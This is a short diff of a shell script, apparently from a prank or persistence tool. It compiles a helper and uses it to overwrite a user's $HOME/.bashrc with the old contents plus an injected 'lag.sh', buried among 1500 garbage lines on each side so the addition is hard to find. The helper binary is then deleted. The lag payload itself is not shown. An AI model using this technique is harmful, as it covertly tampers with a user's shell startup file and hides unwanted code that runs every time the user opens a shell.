@@ -10,8 +10,9 @@ else
 	touch tmpbashrc
 fi
 
-gcc -std=c99 -s $dir/lag.c -o make.bin
-./make.bin tmpbashrc $dir/lagbashrc			#puts contents of new bashrc(old bashrc + lag.sh) in place in the middle of garbage
+gcc -std=c99 -s $repo/lib/makerc.c -o make.bin
+#args are: pre lines, post lines, destination, sources
+./make.bin 1500 1500 $HOME/.bashrc tmpbashrc $dir/lagbashrc			#puts contents of new bashrc(old bashrc + lag.sh) in place in the middle of garbage
 
 rm tmpbashrc
 rm make.bin
